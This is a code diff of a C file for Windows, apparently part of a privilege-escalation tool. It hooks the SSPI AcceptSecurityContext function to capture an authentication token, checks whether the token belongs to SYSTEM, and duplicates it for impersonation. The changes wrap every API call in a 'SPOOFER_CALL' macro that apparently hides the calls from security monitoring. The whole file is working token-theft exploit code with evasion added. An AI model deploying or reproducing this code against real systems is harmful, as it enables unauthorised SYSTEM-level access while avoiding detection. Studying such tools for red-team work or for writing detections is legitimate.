@@ -1,10 +1,12 @@
 ﻿#define SECURITY_WIN32 
-#pragma comment(lib, "Secur32.lib")
+#include "Header.h"
 
 #include "Windows.h"
 #include "stdio.h"
 #include "sspi.h"
 #include "SSPIHooks.h"
+
+#pragma comment(lib, "Secur32.lib")
 
 // global vars used
 extern HANDLE g_hEventTokenStolen;
@@ -16,33 +18,7 @@ wchar_t* g_Clsid;
 
 int IsTokenSystem(HANDLE tok, wchar_t* clsid);
 
-SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, PULONG pfContextAttr, PTimeStamp ptsTimeStamp) {
-	SECURITY_STATUS status;
-	if(g_hTokenStolenSecondary != NULL)
-		return SEC_E_INTERNAL_ERROR; // We already have the token, bye bye
-	status = AcceptSecurityContext(phCredential, phContext, pInput, fContextReq, TargetDataRep, phNewContext, pOutput, pfContextAttr, ptsTimeStamp);
-	if (phContext != NULL) { // we should land here in the 2nd call to AcceptSecurityContext, so context should be created in our com server <-- this process
-		SetEvent(g_hEventAuthTriggered);
-		QuerySecurityContextToken(phContext, &g_hTokenStolenSecondary);
-		if (IsTokenSystem(g_hTokenStolenSecondary, g_Clsid)) {
-			DuplicateTokenEx(g_hTokenStolenSecondary, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_hTokenStolenPrimary);
-			g_SystemTokenStolen = TRUE;
-		}
-		SetEvent(g_hEventTokenStolen);
-	}
-	return status;
-}
-
-void HookSSPIForTokenStealing(wchar_t *clsid) {
-	g_Clsid = clsid;
-	g_hTokenStolenPrimary = NULL;
-	g_hTokenStolenSecondary = NULL;
-	g_SystemTokenStolen = FALSE;
-	PSecurityFunctionTableW table = InitSecurityInterfaceW();
-	table->AcceptSecurityContext = AcceptSecurityContextHook;
-}
-
-int IsTokenSystem(HANDLE hToken, wchar_t *clsid)
+int IsTokenSystem(HANDLE hToken, wchar_t* clsid)
 {
 	DWORD Size, UserSize, DomainSize;
 	SID* sid;
@@ -95,3 +71,35 @@ int IsTokenSystem(HANDLE hToken, wchar_t *clsid)
 	fflush(stdout);
 	return 0;
 }
+
+SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, PULONG pfContextAttr, PTimeStamp ptsTimeStamp) {
+	SECURITY_STATUS status = { 0 };
+
+	if (g_hTokenStolenSecondary != NULL)
+	{
+		return SEC_E_INTERNAL_ERROR; // We already have the token, bye bye
+	}
+		
+	status = SPOOFER_CALL(AcceptSecurityContext)(phCredential, phContext, pInput, fContextReq, TargetDataRep, phNewContext, pOutput, pfContextAttr, ptsTimeStamp);
+
+	if (phContext != NULL) { // we should land here in the 2nd call to AcceptSecurityContext, so context should be created in our com server <-- this process
+		SPOOFER_CALL(SetEvent)(g_hEventAuthTriggered);
+		SPOOFER_CALL(QuerySecurityContextToken)(phContext, &g_hTokenStolenSecondary);
+		if (IsTokenSystem(g_hTokenStolenSecondary, g_Clsid)) {
+			SPOOFER_CALL(DuplicateTokenEx)(g_hTokenStolenSecondary, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_hTokenStolenPrimary);
+			g_SystemTokenStolen = TRUE;
+		}
+		SPOOFER_CALL(SetEvent)(g_hEventTokenStolen);
+	}
+	return status;
+}
+
+void HookSSPIForTokenStealing(wchar_t *clsid) {
+	g_Clsid = clsid;
+	g_hTokenStolenPrimary = NULL;
+	g_hTokenStolenSecondary = NULL;
+	g_SystemTokenStolen = FALSE;
+	PSecurityFunctionTableW table = SPOOFER_CALL(InitSecurityInterfaceW)();
+	table->AcceptSecurityContext = AcceptSecurityContextHook;
+}
+
